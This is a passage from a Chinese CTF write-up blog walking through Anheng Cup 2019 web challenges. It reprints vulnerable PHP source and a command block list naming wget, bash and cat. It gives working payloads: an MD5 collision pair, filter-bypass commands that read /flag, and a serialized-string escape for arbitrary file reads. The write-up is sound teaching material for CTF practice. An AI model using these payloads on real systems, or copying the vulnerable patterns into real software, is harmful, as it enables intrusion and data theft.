class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str=<span class="string">'index.php'</span></span><br><span class="line">filename = str.encode(encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">hex = binascii.b2a_hex(filename)</span><br><span class="line">print(hex)</span><br><span class="line">base1 = base64.b64encode(hex)</span><br><span class="line">base2 = base64.b64encode(base1)</span><br><span class="line">print(base2.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå‚æ•°å·²ç»åˆ©ç”¨å®Œäº†ï¼Œè€Œç¬¬äºŒä¸ªå‚æ•°ç”¨äºrce,ä½†æ˜æ˜¾è¿‡æ»¤äº†è®¸å¤šè¯»å–æ–‡ä»¶çš„å‘½ä»¤ã€‚<br>åŒæ—¶å¯çŸ¥è¦æ‰§è¡Œå‘½ä»¤å¿…é¡»ç»•è¿‡ä¸€å±‚MD5å¯¹æ¯”ã€‚åŸºäºä½¿ç”¨äº†phpå¼ºç›¸ç­‰ç¬¦å·ï¼Œå¯çŸ¥ä¸€å®šè¦æ‰¾åˆ°ä¸€å¯¹MD5ç›¸åŒçš„ä¸åŒå­—ç¬¦ä¸²ã€‚å¯ä»¥ç”¨æŸç§MD5ç¢°æ’ç”Ÿæˆå™¨å¾—åˆ°ã€‚æˆ‘ç›´æ¥ç”¨å®˜æ–¹wpé‡Œçš„å§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯æ‰§è¡Œå‘½ä»¤äº†ã€‚ç›´æ¥åˆ©ç”¨åŒ¹é…æ­£åˆ™é‡Œé¢<code>\</code>çš„ç–å¿½ï¼Œç”¨å®ƒä½¿æˆ‘ä»¬çš„å…³é”®å­—æ„å»ºå‡ºæ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t%20&#x2F;flag                    cat &#x2F;flag</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä½¿ç”¨æ²¡è¢«è¿‡æ»¤çš„è¯»å–æ–‡ä»¶çš„å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort &#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="easy-serialize-php"><a href="#easy-serialize-php" class="headerlink" title="easy_serialize_php"></a>easy_serialize_php</h1><p>é¢˜ç›®å¯¹æˆ‘æœ‰ç‚¹éš¾ï¼Œä½†æ˜¯æ‰“å¼€äº†ååºåˆ—åŒ–æ–°ä¸–ç•Œçš„å¤§é—¨<br>ä¸€é“ååºåˆ—åŒ–åˆ©ç”¨é¢˜ï¼Œä¸Šæ¥ç›´æ¥ç»™äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€è·¯ä¸Šé¦–å…ˆçœ‹çœ‹å¯æ§çš„å‚æ•°ï¼Œæœ‰getä¼ å€¼çš„<code>f,img_path</code>ã€‚ä½†æ˜¯æ³¨æ„åˆ°<code>img_path</code>æ­é…ä¸Š<code>f</code>ä¸º<code>show_image</code>æ—¶ï¼Œè¿”å›çš„å†…å®¹å¹¶ä¸å¯ç”¨ï¼Œå› ä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));</span><br></pre></td></tr></table></figure><p>ä¸­ï¼Œæˆ‘ä»¬ä¼ çš„å€¼ç»è¿‡sha1åŠ å¯†åå¹¶æ²¡æœ‰è§£å¯†ï¼Œæ•…ä¸å¯ç”¨ã€‚<br>æ­¤æ—¶å…³æ³¨å…¶ä»–é‡ç‚¹,æœ‰ä¸€å¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€ä¸ªå˜é‡è¦†ç›–çš„åˆ©ç”¨ã€‚æ‰€ä»¥æˆ‘ä»¬çš„å˜é‡å€¼éƒ½å¯ä»¥é€šè¿‡postæ“ä½œæ”¹å˜ï¼Œè¿™æ ·å¯æ§çš„å‚æ•°å¤šäº†èµ·æ¥ã€‚<br>åŒæ—¶æ³¨æ„åˆ°åºåˆ—åŒ–è¯­å¥ï¼Œä¼šåœ¨è°ƒç”¨<code>show_image</code>æ—¶è¢«è§¦å‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$serialize_info &#x3D; filter(serialize($_SESSION));</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹æ­£åœ¨äºæ­¤ï¼Œåœ¨åºåˆ—åŒ–æ•°æ®ä¹‹åï¼Œå®ƒç»è¿‡äº†ä¸€å±‚è¿‡æ»¤æ‰ç»™å˜é‡èµ‹å€¼ã€‚è€Œä»æœ€ä¸Šæ–¹çš„è¿‡æ»¤å‡½æ•°å¯çŸ¥ï¼Œå‡ºç°è¢«è¿‡æ»¤çš„å…³é”®å­—ç›´æ¥æ›¿æ¢ä¸ºç©ºã€‚é‚£ä¹ˆè¿™æ˜¯å¦ä¼šæœ‰æ¼æ´å¯ä»¥ç”¨å‘¢ï¼Ÿç­”æ¡ˆæ˜¯è‚¯å®šçš„ã€‚å‡ºé¢˜äººå¦‚æ˜¯è¯´ï¼š</p><blockquote><p>ä»»ä½•å…·æœ‰ä¸€å®šç»“æ„çš„æ•°æ®ï¼Œå¦‚æœç»è¿‡äº†æŸäº›å¤„ç†è€ŒæŠŠç»“æ„ä½“æœ¬èº«çš„ç»“æ„ç»™æ‰“ä¹±äº†ï¼Œåˆ™æœ‰å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ã€‚</p></blockquote><p>å…¶æ„ä¹‰åœ¨äºï¼Œç»™<code>user</code>æ‰€èµ‹çš„å€¼åˆšå¥½24ä¸ªï¼Œè€Œè¿™24ä¸ªå­—ç¬¦ç”±äºè¿‡æ»¤<code>flag</code>çš„åŸå› ï¼Œåœ¨ç»è¿‡åºåˆ—åŒ–åè¢«ç½®ä¸ºç©ºã€‚è¿™æ—¶å°±å¯ä»¥åæ‰ä¸€ä¸ªfunctionï¼Œåšåˆ°ä»»æ„è¯»å–æ–‡ä»¶ã€‚</p><p>é¦–å…ˆä»æç¤ºphpinfoå¤„æ‰¾åˆ°ä¸€ä¸ªä¸å¯ç›´æ¥è¯»çš„phpæ–‡ä»¶ï¼Œæˆ‘ä»¬å…ˆå°è¯•åˆ©ç”¨æ¼æ´è¯»å–å®ƒçœ‹çœ‹ã€‚ï¼ˆç”±äºå…³é”®å­—é‡Œè¿‡æ»¤äº†f1agï¼Œæ‰€ä»¥åœ¨phpinfoç•Œé¢æœf1agå…³é”®å­—ï¼Œæœæ–­å‘ç°d0g3_f1ag.phpï¼‰<br>ä¸‹é¢æˆ‘æ¥æ„é€ ä¸‹åºåˆ—åŒ–çš„ç±»ï¼Œä»æºç çŸ¥é“SESSIONç±»æœ‰ä¸‰ä¸ªå±æ€§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SESSION</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $user=<span class="string">"flagflagflagflagflagflag"</span>;</span><br><span class="line">    <span class="keyword">var</span> $function=<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:1:"a";&#125;'</span>;<span class="comment"># å…¶ä¸­ä¸ºd0g3_f1ag.php base64ç¼–ç </span></span><br><span class="line">    <span class="keyword">var</span> $img=<span class="string">"MS5qcGc="</span>;<span class="comment"># å€¼ä¸º1.jpgçš„base64ç¼–ç </span></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> SESSION();</span><br><span class="line"><span class="keyword">echo</span>(serialize($a));</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆçš„payloadå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"SESSION"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">"flagflagflagflagflagflag"</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">61</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;&#125;<span class="string">";s:3:"</span>img<span class="string">";s:8:"</span>MS5qcGc=<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>è€Œç»è¿‡è¿‡æ»¤å</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">"SESSION"</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">"user"</span>;s:<span class="number">24</span>:<span class="string">""</span>;s:<span class="number">8</span>:<span class="string">"function"</span>;s:<span class="number">61</span>:<span class="string">"a"</span>;s:<span class="number">3</span>:<span class="string">"img"</span>;s:<span class="number">20</span>:<span class="string">"ZDBnM19mMWFnLnBocA=="</span>;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">1</span>:<span class="string">"a"</span>;&#125;<span class="string">";s:3:"</span>img<span class="string">";s:8:"</span>MS5qcGc=<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure><p>æ­¤æ—¶userå±æ€§å¯¹åº”çš„å€¼è¢«ç½®ç©ºï¼Œé‚£ä¹ˆå®ƒå°±è¦å»æŠŠåé¢çš„24ä¸ªå­—ç¬¦ç½®ä¸ºå®ƒçš„å€¼ã€‚ä¹Ÿå°±æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";s:8:"</span><span class="function"><span class="keyword">function</span>"</span>;s:<span class="number">59</span>:<span class="string">"a"</span></span><br></pre></td></tr></table></figure><p><strong>ç›¸å½“äºåæ‰äº†functionå±æ€§</strong>ï¼Œä½†æ˜¯æˆ‘ä»¬æ„é€ çš„<code>$function</code>ä¸­ï¼ŒåŒ…å«äº†<code>img</code>å±æ€§çš„å€¼ï¼Œä»¥åŠæ„é€ çš„ä¸€ä¸ª<code>test</code>å±æ€§çš„å€¼ï¼Œä½¿å¾—æˆ‘ä»¬çš„åºåˆ—åŒ–æ•°æ®ä»ç„¶æ˜¯æ»¡è¶³ä¸€ä¸ªç±»å¯¹åº”ä¸‰ä¸ªé”®å€¼ã€‚è¿™æ—¶å®ƒå¯¹åºåˆ—åŒ–æ•°æ®çš„åŒ¹é…å°±æ˜¯ç”±<code>{</code>å¼€å§‹ï¼Œåˆ°<code>}</code>ç»“æŸã€‚æ‰€ä»¥åé¢å¤šä½™çš„å­—ç¬¦<code>&quot;;s:3:&quot;img&quot;;s:8:&quot;MS5qcGc=&quot;;}</code>å…¨éƒ¨è¢«å¿½ç•¥ã€‚<br>è¿™æ ·ï¼Œæˆ‘ä»¬é€šè¿‡æ§åˆ¶functionå±æ€§çš„å€¼ï¼Œè¾¾åˆ°äº†æ§åˆ¶<code>img</code>å±æ€§å€¼çš„æ•ˆæœï¼Œä»è€Œè§¦å‘ååºåˆ—åŒ–ï¼Œè¯»å–æ–‡ä»¶ã€‚<br>æœ€ç»ˆpayloadå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]&#x3D;flagflagflagflagflagflag&amp;_SESSION[function]&#x3D;a&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;s:4:&quot;test&quot;;s:1:&quot;a&quot;;&#125;&amp;function&#x3D;show_image</span><br></pre></td></tr></table></figure><p>(functionä¹Ÿå¯ä»¥ç›´æ¥getä¼ )<br><img src="/2020/02/10/%E5%AE%89%E6%B4%B5%E6%9D%AF2019-web%E5%A4%8D%E7%8E%B0/2.jpg" class="lazyload" data-srcset="2.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>å¦å¤–é¢˜ç›®æ„é€ çš„å…¶å®æ˜¯SESSIONæ•°ç»„è¿›è¡Œåºåˆ—åŒ–ï¼Œä½†æ˜¯åºåˆ—åŒ–æ ¼å¼ä¸€æ ·ï¼Œéƒ½å¯è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$b=<span class="keyword">array</span>(<span class="string">"user"</span>=&gt;<span class="string">"flagflagflagflagflagflag"</span>,</span><br><span class="line">    <span class="string">"function"</span>=&gt;<span class="string">'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:4:"test";s:1:"a";&#125;'</span>,</span><br><span class="line">    <span class="string">"img"</span>=&gt;<span class="string">"MS5qcGc="</span>);</span><br><span class="line"><span class="keyword">echo</span>(serialize($b));</span><br></pre></td></tr></table></figure><h1 id="ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "></a>ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h1><p>ä¹Ÿæ˜¯ä¸€é“ååºåˆ—åŒ–é¢˜ç›®ï¼Œæ„å›¾åœ¨äºååºåˆ—åŒ–ç»“åˆsqlæ³¨å…¥ã€‚åœ¨æºç å®¡è®¡ä¸Šä¸‹äº†ä¸å°‘åŠŸå¤«ã€‚å¦‚æœæˆ‘åœ¨æ¯”èµ›ä¸­åšå¤šåŠä¼šå¡åœ¨sqlæ³¨å…¥ä¸Šå§ã€‚</p><p>é¦–å…ˆè¿›å…¥é¡µé¢ï¼Œå¯ä»¥å‘ç°ç½‘ç«™åº•éƒ¨ç•™ä¸‹äº†wowouploadimageï¼Œå¯ä»¥æ‹¿åˆ°ä¸€ä»½æºç ã€‚ä¸»è¦å†…å®¹å¦‚ä¸‹ï¼š<br>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span> <span class="keyword">extends</span> <span class="title">helper</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_base</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_FILES)&#123;</span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>])&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Upload file failed."</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$file = <span class="keyword">new</span> upload();</span><br><span class="line">$file-&gt;upload_base();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> helper();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>show.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./helper.php"</span>);</span><br><span class="line">$show = <span class="keyword">new</span> show();</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>])&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">"delete_all"</span>] == <span class="string">"true"</span>)&#123;</span><br><span class="line">$show-&gt;Delete_All_Images();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$show-&gt;Get_All_Images();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $con;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;con = mysqli_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"pic_base"</span>);</span><br><span class="line"><span class="keyword">if</span> (mysqli_connect_errno(<span class="keyword">$this</span>-&gt;con))&#123; </span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"Connect MySQL Fail:"</span>.mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_All_Images</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sql = <span class="string">"SELECT * FROM images"</span>;</span><br><span class="line">$result = mysqli_query(<span class="keyword">$this</span>-&gt;con, $sql);</span><br><span class="line"><span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_assoc())&#123;</span><br><span class="line">    <span class="keyword">if</span>($row[<span class="string">"attr"</span>])&#123;</span><br><span class="line">    $attr_temp = str_replace(<span 